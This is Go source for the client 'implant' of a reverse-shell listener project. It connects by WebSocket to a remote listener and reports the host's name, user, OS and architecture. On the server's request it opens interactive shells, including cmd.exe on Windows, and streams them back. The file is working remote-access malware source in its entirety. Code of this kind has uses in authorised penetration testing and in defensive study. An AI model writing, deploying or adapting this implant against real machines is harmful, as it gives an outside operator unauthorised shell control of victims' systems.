// Package client implements the Go implant for the multiplexed reverse-shell
// protocol defined in proto/mux.proto.
package client

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"github.com/nemanjan00/reverse-shell-listener/client/muxpb"
	"github.com/nemanjan00/reverse-shell-listener/client/pty"
	"google.golang.org/protobuf/proto"
)

const (
	defaultServerURL = "ws://127.0.0.1:8080/mux"
	protoVersion     = 1
	writeTimeout     = 10 * time.Second
	pongTimeout      = 60 * time.Second
)

// Config controls how the implant connects and what metadata it reports.
type Config struct {
	ServerURL string // e.g. ws://host:8080/mux or wss://host:443/mux
	Tags      string // free-form label shown in the dashboard
	Shell     string // shell/command to run when opening a channel (empty = default)
}

func (c *Config) serverURL() string {
	if c.ServerURL != "" {
		return c.ServerURL
	}
	if u := os.Getenv("RSL_SERVER"); u != "" {
		return u
	}
	return defaultServerURL
}

// Client maintains one persistent WebSocket to the listener and multiplexes
// several PTY-backed shell channels over it.
type Client struct {
	cfg      Config
	dialer   websocket.Dialer
	conn     *websocket.Conn
	mu       sync.Mutex
	channels map[uint32]*channel
	stop     chan struct{}
}

// channel is one server-requested PTY shell.
type channel struct {
	id       uint32
	pty      pty.PTY
	resizeCh chan *muxpb.Resize
	done     chan struct{}
}

// Run connects to the server and blocks until the connection is lost.
func Run(ctx context.Context, cfg Config) error {
	c := &Client{
		cfg:      cfg,
		channels: make(map[uint32]*channel),
		stop:     make(chan struct{}),
	}
	return c.run(ctx)
}

func (c *Client) run(ctx context.Context) error {
	serverURL := c.cfg.serverURL()
	log.Printf("[client] connecting to %s", serverURL)

	conn, _, err := c.dialer.DialContext(ctx, serverURL, http.Header{})
	if err != nil {
		return fmt.Errorf("dial %s: %w", serverURL, err)
	}
	c.conn = conn
	defer c.close()

	if err := c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_Hello{Hello: &muxpb.Hello{
			Hostname: hostname(),
			Username: username(),
			Os:       runtime.GOOS,
			Arch:     runtime.GOARCH,
			Version:  protoVersion,
			Tags:     c.cfg.Tags,
		}},
	}); err != nil {
		return fmt.Errorf("send hello: %w", err)
	}

	ctx, cancel := context.WithCancel(ctx)
	defer cancel()

	go c.pingLoop(ctx)
	go c.readLoop(ctx)

	<-ctx.Done()
	return ctx.Err()
}

func (c *Client) close() {
	c.mu.Lock()
	chans := make([]*channel, 0, len(c.channels))
	for _, ch := range c.channels {
		chans = append(chans, ch)
	}
	c.mu.Unlock()
	for _, ch := range chans {
		c.closeChannel(ch)
	}
	if c.conn != nil {
		c.conn.Close()
	}
	close(c.stop)
}

func (c *Client) pingLoop(ctx context.Context) {
	ticker := time.NewTicker(20 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			if err := c.write(&muxpb.Frame{
				Kind: &muxpb.Frame_Ping{Ping: &muxpb.Ping{Nonce: uint64(time.Now().UnixNano())}},
			}); err != nil {
				return
			}
		}
	}
}

func (c *Client) readLoop(ctx context.Context) {
	c.conn.SetPongHandler(func(_ string) error {
		c.conn.SetReadDeadline(time.Now().Add(pongTimeout))
		return nil
	})
	c.conn.SetReadDeadline(time.Now().Add(pongTimeout))

	for {
		_, data, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("[client] websocket error: %v", err)
			}
			return
		}
		c.conn.SetReadDeadline(time.Now().Add(pongTimeout))

		var frame muxpb.Frame
		if err := proto.Unmarshal(data, &frame); err != nil {
			log.Printf("[client] malformed frame: %v", err)
			continue
		}
		c.handleFrame(ctx, &frame)
	}
}

func (c *Client) handleFrame(ctx context.Context, frame *muxpb.Frame) {
	switch v := frame.Kind.(type) {
	case *muxpb.Frame_OpenRequest:
		go c.openChannel(ctx, v.OpenRequest)
	case *muxpb.Frame_Data:
		c.mu.Lock()
		ch := c.channels[v.Data.ChannelId]
		c.mu.Unlock()
		if ch != nil && ch.pty != nil {
			ch.pty.Write(v.Data.Data)
		}
	case *muxpb.Frame_Resize:
		c.mu.Lock()
		ch := c.channels[v.Resize.ChannelId]
		c.mu.Unlock()
		if ch != nil {
			select {
			case ch.resizeCh <- v.Resize:
			case <-ch.done:
			}
		}
	case *muxpb.Frame_Close:
		c.mu.Lock()
		ch := c.channels[v.Close.ChannelId]
		c.mu.Unlock()
		if ch != nil {
			c.closeChannel(ch)
		}
	case *muxpb.Frame_Ping:
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_Pong{Pong: &muxpb.Pong{Nonce: v.Ping.Nonce}},
		})
	case *muxpb.Frame_Pong:
		// handled by SetPongHandler
	}
}

func (c *Client) openChannel(ctx context.Context, req *muxpb.OpenRequest) {
	ch := &channel{
		id:       req.ChannelId,
		resizeCh: make(chan *muxpb.Resize, 8),
		done:     make(chan struct{}),
	}

	cmd := c.cfg.Shell
	if cmd == "" {
		cmd = defaultShell()
	}

	cols, rows := req.Cols, req.Rows
	if cols == 0 {
		cols = 80
	}
	if rows == 0 {
		rows = 24
	}

	shell, err := pty.Start(cmd, cols, rows)
	if err != nil {
		log.Printf("[client] channel %d open failed: %v", req.ChannelId, err)
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_OpenError{OpenError: &muxpb.OpenError{
				ChannelId: req.ChannelId,
				Message:   err.Error(),
			}},
		})
		return
	}

	ch.pty = shell

	c.mu.Lock()
	c.channels[req.ChannelId] = ch
	c.mu.Unlock()

	_ = c.write(&muxpb.Frame{
		Kind: &muxpb.Frame_OpenOk{OpenOk: &muxpb.OpenOk{
			ChannelId: req.ChannelId,
			Pid:       0,
		}},
	})

	go c.pumpStdout(ch)
	go c.resizeLoop(ch)

	go func() {
		<-ch.done
		c.mu.Lock()
		delete(c.channels, ch.id)
		c.mu.Unlock()
		_ = c.write(&muxpb.Frame{
			Kind: &muxpb.Frame_Close{Close: &muxpb.Close{
				ChannelId: ch.id,
				Reason:    "shell exited",
			}},
		})
	}()
}

func (c *Client) pumpStdout(ch *channel) {
	buf := make([]byte, 4096)
	for {
		n, err := ch.pty.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			if err := c.write(&muxpb.Frame{
				Kind: &muxpb.Frame_Data{Data: &muxpb.Data{
					ChannelId: ch.id,
					Data:      data,
				}},
			}); err != nil {
				break
			}
		}
		if err != nil {
			break
		}
	}
	c.closeChannel(ch)
}

func (c *Client) resizeLoop(ch *channel) {
	for {
		select {
		case r := <-ch.resizeCh:
			if ch.pty != nil {
				_ = pty.Resize(ch.pty, r.Cols, r.Rows)
			}
		case <-ch.done:
			return
		}
	}
}

func (c *Client) closeChannel(ch *channel) {
	select {
	case <-ch.done:
		return
	default:
	}
	close(ch.done)
	if ch.pty != nil {
		ch.pty.Close()
	}
}

func (c *Client) write(frame *muxpb.Frame) error {
	data, err := proto.Marshal(frame)
	if err != nil {
		return err
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.conn == nil {
		return fmt.Errorf("not connected")
	}
	_ = c.conn.SetWriteDeadline(time.Now().Add(writeTimeout))
	return c.conn.WriteMessage(websocket.BinaryMessage, data)
}

func defaultShell() string {
	switch runtime.GOOS {
	case "windows":
		return "cmd.exe"
	default:
		if sh := os.Getenv("SHELL"); sh != "" {
			return sh
		}
		return "/bin/sh"
	}
}

func hostname() string {
	h, _ := os.Hostname()
	return h
}

func username() string {
	u := os.Getenv("USER")
	if u == "" {
		u = os.Getenv("USERNAME")
	}
	return u
}

// ParseConfig builds a Config from command-line flags / env vars.
func ParseConfig(args []string) (Config, error) {
	cfg := Config{}
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-s", "--server":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.ServerURL = normalizeServerURL(args[i])
		case "-t", "--tags":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.Tags = args[i]
		case "-c", "--shell":
			if i+1 >= len(args) {
				return cfg, fmt.Errorf("%s requires a value", args[i])
			}
			i++
			cfg.Shell = args[i]
		case "-h", "--help":
			return cfg, fmt.Errorf("help")
		}
	}
	return cfg, nil
}

// Usage returns a short help string.
func Usage() string {
	return `usage: rsl-client [options]

options:
  -s, --server URL   listener websocket URL (default ws://127.0.0.1:8080/mux,
                     or RSL_SERVER env var)
  -t, --tags TAGS    free-form label shown in the dashboard
  -c, --shell CMD    shell command to run for each channel (default: $SHELL)
  -h, --help         show this help`
}

func normalizeServerURL(raw string) string {
	raw = strings.TrimSpace(raw)
	if !strings.Contains(raw, "://") {
		raw = "ws://" + raw
	}
	if !strings.HasSuffix(raw, "/mux") {
		raw = strings.TrimSuffix(raw, "/") + "/mux"
	}
	return raw
}

func parseUint32(s string, def uint32) uint32 {
	if s == "" {
		return def
	}
	v, err := strconv.ParseUint(s, 10, 32)
	if err != nil {
		return def
	}
	return uint32(v)
}

// FileExists reports whether path exists (used by main to pick shell).
func FileExists(path string) bool {
	_, err := os.Stat(path)
	return err == nil
}
